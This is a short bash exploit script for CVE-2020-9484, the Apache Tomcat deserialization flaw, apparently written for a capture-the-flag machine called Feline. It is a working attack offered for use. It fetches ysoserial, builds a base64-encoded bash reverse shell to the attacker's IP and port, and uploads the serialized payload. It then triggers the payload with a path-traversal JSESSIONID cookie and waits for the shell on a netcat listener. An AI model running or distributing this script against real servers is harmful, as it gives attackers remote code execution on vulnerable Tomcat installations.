#!/bin/bash
#feilne

#Created by Ac1d

RS='\033[0m'
R='\033[0;31m'
G='\033[0;32m'
LB='\033[1;34m'
CY='\033[0;36m'
W='\033[1;73m'



printf  "${G}  ___  _  _  ____     ___   ___  ___   ___        ___   __   ___   __ ${RS} \n"
printf  "${G} / __)( \/ )( ___)___(__ \ / _ \(__ \ / _ \  ___ / _ \ /. | ( _ ) /. |${RS} \n"
printf  "${G}( (__  \  /  )__)(___)/ _/( (_) )/ _/( (_) )(___)\_  /(_  _)/ _ \(_  _)${RS}\n"
printf  "${G} \___)  \/  (____)   (____)\___/(____)\___/       (_/   (_) \___/  (_)${RS}\n "
printf "${LB}\n Created for Feline ${RS}"

if [ ${#@} -lt 3 ]; then
        echo -e "\nUsage: ./CVE-2020-9484 web-ip rev-ip rev-port"
        echo "Eg: ./CVE-2020-9484 10.10.10.10 192.168.1.1 4444"
        exit 1;
fi

YSOSERIAL_URL="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar"

CV_URL=$1
CV_LHOST=$2
CV_LPORT=$3

printf "${W}\n\n[-] Getting resources (ysoserial.jar) from github ${RS}"
wget  "$YSOSERIAL_URL" -O ysoserial.jar -q
BASHSHELL="bash -i >& /dev/tcp/$2/$3 0>&1"
PAYLOAD=$(echo "$BASHSHELL" | base64)
echo "${G}[+] Generated shell payload: $PAYLOAD ${RS}"
PAYLOAD2="bash -c {echo,$PAYLOAD}|{base64,-d}|{bash,-i}"
printf "${G}[+] Generated payload2: $PAYLOAD2 ${RS}"
java -jar ysoserial.jar CommonsCollections2 "${PAYLOAD2}" > cve.session
rm ysoserial.jar
URL="$CV_URL/upload.jsp?email=pwned"
#echo "$URL"
printf "${G}[+] Starting Netcat.${RS}"
printf "${W}\n[-] Helpful cmd..${RS}"
printf "${G}\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n${RS}"
#curl -F 'image=@cve.session' "$URL"
#curl --cookie "JSESSIONID=../../../../../opt/samples/uploads/cve" -L "$URL"
(sleep 2;curl -F 'image=@cve.session' "$URL" &>/dev/null ;curl --cookie "JSESSIONID=../../../../../opt/samples/uploads/cve" -L "$URL" &>/dev/null ) &
(sleep 5; rm cve.session) &

nc -lnvp $CV_LPORT
